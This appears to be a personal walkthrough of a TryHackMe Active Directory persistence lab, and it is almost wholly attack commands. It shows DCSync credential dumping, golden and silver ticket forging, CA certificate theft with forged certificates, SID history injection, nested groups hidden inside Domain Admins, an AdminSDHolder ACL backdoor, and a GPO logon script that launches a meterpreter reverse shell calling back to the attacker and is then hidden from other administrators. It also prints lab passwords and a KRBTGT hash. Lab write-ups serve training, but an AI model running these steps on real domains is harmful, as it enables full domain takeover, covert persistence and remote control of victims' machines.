'''scope
THMCHILDDC - 10.200.61.101
Initial Credentials - http://distributor.za.tryhackme.loc/creds
'''

## Exploitation:
- Added the DNS IP address of THMDC in `/etc/systemd/resolved.conf`
- Restarted the service
```bash
systemctl restart systemd-resolved
```

- If this didnt work revert the file `/etc/systemd/resolved.conf` to normal and add the IP in `/etc/resolv.conf` in nameserver
- Got the credentials
	carolyn.king:Changeme123
- As we already have compromised the domain we have the admin creds as well for the domain `ZA`
	Administrator:tryhackmewouldnotguess1@
---------------------------------------------------------------------------------
- Got in using
```bash
ssh za.tryhackme.loc\\carolyn.king@thmwrk1.za.tryhackme.loc
```

- We can use the DA creds to setup persistence to our low priv user
- Logged in as DA
```bash
ssh za.tryhackme.loc\\Administrator@thmwrk1.za.tryhackme.loc
```

- We can use `mimikatz` to dump all hashes
```bash
lsadump::dcsync /domain:za.tryhackme.loc /all
```

- We can also use `secretsdump.py` to dump them on kali
```bash
secretsdump.py Administrator:'tryhackmewouldnotguess1@'@za.tryhackme.loc
```

- We need the KRBTGT hash
```bash
16f9af38fca3ada405386b3b57366082
```

- We need to get Domain SID and User SID
```bash
Get-ADDomain
```

- We can also get it on our kali
```bash
lookupsid.py Administrator:'tryhackmewouldnotguess1@'@za.tryhackme.loc

# S-1-5-21-3885271727-2693558621-2658995185
```

- Now we can create a golden ticket using `mimikatz`
```bash
kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
```

- Using kali we can do
```bash
ticketer.py -nthash 16f9af38fca3ada405386b3b57366082 -domain-sid S-1-5-21-3885271727-2693558621-2658995185 -domain za.tryhackme.loc ReallyNotALegitAccount
```

- To use the ticket on kali
```bash
echo "export KRB5CCNAME=/home/crypt0ace/Desktop/Write-Ups/THM/AD/PersistingAD/ReallyNotALegitAccount.ccache" >> ~/.bashrc
. ~/.bashrc
tail ~/.bashrc
```

- To use it with `psexec.py`
```bash
export KRB5CCNAME=/home/crypt0ace/Desktop/Write-Ups/THM/AD/PersistingAD/ReallyNotALegitAccount.ccache; psexec.py -dc-ip 10.200.61.101 -target-ip 10.200.61.101 -no-pass -k za.tryhackme.loc/ReallyNotALegitAccount@za.tryhackme.loc
```

- To generate a silver ticket we can use
```bash
kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
```
---------------------------------------------------------------------------------
- We can add persistence through certificates but it it highly invasive and will need a full domain rebuild so its not recommended
- Loaded `mimikatz`
- We can look at the certificates on the local machine
```bash
crypto::certificates /systemstore:local_machine
```

- Found one with exportable key
- We can patch it and make other exportable too
```bash
privilege::debug
crypto::capi
crypto::cng
```

- We can export it using
```bash
crypto::certificates /systemstore:local_machine /export
```

- We are interested in `local_machine_My_1_za-THMDC-CA.pfx`
- Copied it to my SMB server
```bash
$pass = convertto-securestring "password" -AsPlainText -Force # To convert it to useable password
$cred = New-Object System.Management.Automation.PSCredential('ace', $pass) # Setting up cred object with username and password
New-PSDrive -Name "ace" -PSProvider FileSystem -Credential $cred -Root \\10.50.58.85\share # Connecting the drive to windows
cd ace:
```

- Copied it to THMWRK1
- Now we can `ForgeCert`
```bash
C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath local_machine_My_1_za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 
```

- We can use `Rubeus.exe` to forge a TGT
```bash
C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Password123  /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.61.101
```

- Then we can use `mimikatz` to load it
```bash
kerberos::ptt administrator.kirbi
```

- Got in
---------------------------------------------------------------------------------
- We can look at SIDs that our current user has
```bash
Get-ADUser carolyn.king -properties sidhistory,memberof
```

- We dont have anything
- Now we can find the SID of the domain admins group and add that in
```bash
Get-ADGroup "Domain Admins"

# S-1-5-21-3885271727-2693558621-2658995185-512
```

- Now we can login as DA to edit the SID history
- We will use `DSinternals` to edit it from `ntds.dit` itself
```bash
Stop-Service -Name ntds -force 
Add-ADDBSidHistory -SamAccountName 'carolyn.king' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath C:\Windows\NTDS\ntds.dit 
Start-Service -Name ntds
```

- Now we have the SID history of Domain Admins
- We can test it
```bash
dir \\thmdc.za.tryhackme.loc\c$ 
```

- Got in
---------------------------------------------------------------------------------
- We can use Group Nesting as persistence
- First we add a new group of IT
```bash
New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "crypt0ace Net Group 1" -SamAccountName "crypt0ace_nestgroup1" -DisplayName "crypt0ace Nest Group 1" -GroupScope Global -GroupCategory Security
```

- Now we can create and add in Sales
```bash
New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "crypt0ace Net Group 2" -SamAccountName "crypt0ace_nestgroup2" -DisplayName "crypt0ace Nest Group 2" -GroupScope Global -GroupCategory Security 

Add-ADGroupMember -Identity "crypt0ace_nestgroup2" -Members "crypt0ace_nestgroup1"
```

- We can keep adding these nests
```bash
New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "crypt0ace Net Group 3" -SamAccountName "crypt0ace_nestgroup3" -DisplayName "crypt0ace Nest Group 3" -GroupScope Global -GroupCategory Security

Add-ADGroupMember -Identity "crypt0ace_nestgroup3" -Members "crypt0ace_nestgroup2"

New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "crypt0ace Net Group 4" -SamAccountName "crypt0ace_nestgroup4" -DisplayName "crypt0ace Nest Group 4" -GroupScope Global -GroupCategory Security

Add-ADGroupMember -Identity "crypt0ace_nestgroup4" -Members "crypt0ace_nestgroup3"

New-ADGroup -Path "OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "crypt0ace Net Group 5" -SamAccountName "crypt0ace_nestgroup5" -DisplayName "crypt0ace Nest Group 5" -GroupScope Global -GroupCategory Security

Add-ADGroupMember -Identity "crypt0ace_nestgroup5" -Members "crypt0ace_nestgroup4"
```

- Now we can add it to Domain Admins
```bash
Add-ADGroupMember -Identity "Domain Admins" -Members "crypt0ace_nestgroup5"
```

- Now we can add our low privileged user to it
```bash
Add-ADGroupMember -Identity "crypt0ace_nestgroup1" -Members "carolyn.king"
```

- We can now see that our user is not shown in Domain Admins
```bash
Get-ADGroupMember -Identity "Domain Admins"
```

- And we are not being seen
---------------------------------------------------------------------------------
- RDP into THMWRK1
- Used `runas` to open a admin command prompt
```bash
runas /netonly /user:Administrator cmd.exe
```

- We can add persistence using AdminSDHolder to add our ACLs
- Opened `mmc`
- From there File->Add Snap-In->Active Directory Users and Groups. View->Advanced Features. We can find the AdminSDHolder group under Domain->System
- Right-click->Properties->Security
- Add your user and give Full Control
- Now every 60 min it will be executed
- We can speed it up by using `Invoke-ADSDPropagation`
```bash
Import-Module .\Invoke-ADSDPropagation.ps1 
Invoke-ADSDPropagation
```

- We will get Full Control
---------------------------------------------------------------------------------
- We can add persistense using GPOs as well
- We can create a shell to call back at every logon
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > cryptoace_shell.exe
```

- Now we can create a batch script that will copy the shell and execute it on logon
```bash
copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\cryptoace_shell.exe C:\tmp\cryptoace_shell.exe && timeout /t 20 && C:\tmp\cryptoace_shell.exe
```

- We can add it using `scp`
```bash
scp cryptoace_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/

scp cryptoace.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
```

- Now we can start a listener
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit -j"
```

- Now we will need to use `runas` to admin command prompt to set up GPOs
```bash
runas /netonly /user:Administrator cmd.exe
```

- We will open `mmc` and add `Group Policy Management` Snap-In
- Found the Admin OU and added a GPO in it
- Right-click on your policy and select Enforced
- Now edited
```bash
Under User Configuration, expand Policies->Windows Settings.
Select Scripts (Logon/Logoff).
Right-click on Logon->Properties
Select the Scripts tab.
Click Add->Browse.
```

- Added the path `C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/`
- Now at every logon (Sign in) we will get a callback
- We can change password and test it too
- Now we can hide it
- In the `Admins` group go to delegation
- By default, all administrators have the ability to edit GPOs. Let's remove these permissions:
    1. **Right-Click** on **ENTERPRISE DOMAIN CONTROLLERS** and select **Edit settings, delete, modify security**.
    2. **Click** on all other groups (except Authenticated Users) and click **Remove**.

- Now its hard to find or kill
---------------------------------------------------------------------------------

PWNEDD!!!